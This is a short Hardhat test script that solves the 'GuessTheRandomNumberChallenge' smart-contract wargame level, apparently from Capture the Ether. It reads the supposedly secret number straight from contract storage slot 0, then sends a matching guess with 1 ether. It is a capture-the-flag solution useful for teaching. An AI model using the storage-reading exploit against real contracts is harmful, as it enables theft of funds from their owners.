import {ethers} from "hardhat";
import {BigNumber, Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let secretNumber: BigNumber;
let sendValue = ethers.utils.parseEther("1");

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("GuessTheRandomNumberChallenge", attacker);
    contract = factory.attach(`0xb53bdA8ED1E98D2E2a6C273c83783cD4580007c1`);
});

it("solves the challenge", async function () {
    secretNumber = BigNumber.from(await contract.provider.getStorageAt(contract.address, 0))
    let tx = await contract.guess(secretNumber, {value: sendValue});
    console.log(tx.hash);
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});